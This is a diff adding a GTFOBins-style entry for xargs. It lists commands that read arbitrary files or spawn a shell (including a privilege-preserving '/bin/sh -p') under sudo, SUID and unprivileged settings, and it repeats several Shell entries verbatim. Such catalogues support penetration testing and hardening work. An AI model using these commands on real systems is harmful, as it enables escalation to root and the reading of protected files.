@@ -1,0 +1,44 @@
+xargs
+=====
+
+File read
+---------
+
+[Sudo]
+    xargs -a /path/to/input-file -0
+
+[SUID]
+    xargs -a /path/to/input-file -0
+
+[Unprivileged]
+    xargs -a /path/to/input-file -0
+
+Shell
+-----
+
+[Sudo]
+    xargs -a /dev/null /bin/sh
+
+[SUID]
+    xargs -a /dev/null /bin/sh -p
+
+[Unprivileged]
+    xargs -a /dev/null /bin/sh
+
+[Sudo]
+    xargs -a /dev/null /bin/sh
+
+[SUID]
+    xargs -a /dev/null /bin/sh -p
+
+[Unprivileged]
+    xargs -a /dev/null /bin/sh
+
+[Sudo]
+    echo x | xargs -o -a /dev/null /bin/sh
+
+[SUID]
+    echo x | xargs -o -a /dev/null /bin/sh -p
+
+[Unprivileged]
+    echo x | xargs -o -a /dev/null /bin/sh
